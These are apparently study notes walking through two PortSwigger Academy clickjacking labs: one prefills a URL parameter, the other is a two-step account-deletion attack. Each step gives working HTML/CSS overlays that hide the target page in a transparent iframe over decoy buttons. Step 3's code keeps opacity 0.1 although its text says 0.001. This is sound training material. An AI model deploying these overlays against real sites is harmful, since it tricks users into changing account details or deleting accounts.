
### Lab: [Clickjacking with form input data prefilled from a URL parameter](https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input)



```
<style>
    iframe {
        position:relative;
        width:700px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="https://0a6300da03f5cd56c1068024003400fe.web-security-academy.net/my-account?email=abc@hehe.com"></iframe>
```

![](../../Img_note/Pasted%20image%2020221215184000.png)

Change  opacity to 0.001 and `Test me` to `Click me`
```
<style>
    iframe {
        position:relative;
        width:700px;
        height: 500px;
        opacity: 0.001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a6300da03f5cd56c1068024003400fe.web-security-academy.net/my-account?email=abc@hehe.com"></iframe>
```
![](../../Img_note/Pasted%20image%2020221215184509.png)



### Lab: [Multistep clickjacking](https://portswigger.net/web-security/clickjacking/lab-multistep)


	Description: This lab has some account functionality that is protected by a CSRF token and also has a confirmation dialog to protect against Clickjacking. To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions. You will need to use two elements for this lab.
	You can log in to the account yourself using the following credentials: `wiener:peter`


**Step 1**:  Open the web application and observe function delete account
When i'm trying to delete account, the application will ask again if you want to delete the acccount
![](../../Img_note/Pasted%20image%2020221215184650.png)

![](../../Img_note/Pasted%20image%2020221215184705.png)

**Step 2**: Locate to clickjacking
We need to make clickjacking with 2 click, one click at button ==Delete account==, one click at button ==Yes== after click ==Delete account

We use iframe to embed the vuln web aplication to malicious web. Create two button is ==Click me first== and ==Click me second== according to the given request. Set the opacity to 0.1 so we can easily align the position of the button.

```
<style>
	iframe {
		position:relative;
		width:700px;
		height: 500px;
		opacity: 0.1;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:300px;
		left:50px;
		z-index: 1;
	}
   .secondClick {
		top:300px;
		left:200px;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0a900027038c73a0c009bd8e00f000c7.web-security-academy.net/my-account"></iframe>
```

Add the above code to the exploit server, click ==Store==, ==View Exploit== to see the result

![](../../Img_note/Pasted%20image%2020221215185820.png)

**Step 3**:  Align the position of the button

I will fix value:
heigth: 550px, 
top of firstClick to 500px,
opacity to 0.001

```
<style>
	iframe {
		position:relative;
		width:700px;
		height: 550px;
		opacity: 0.1;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:500px;
		left:50px;
		z-index: 1;
	}
   .secondClick {
		top:300px;
		left:200px;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0a900027038c73a0c009bd8e00f000c7.web-security-academy.net/my-account"></iframe>
```

Click ==Store== to change the script, ==View Exploit== to check again, if everything looks ok, click ==Deliver to victim== and we will get this result

![](../../Img_note/Pasted%20image%2020221215190436.png)


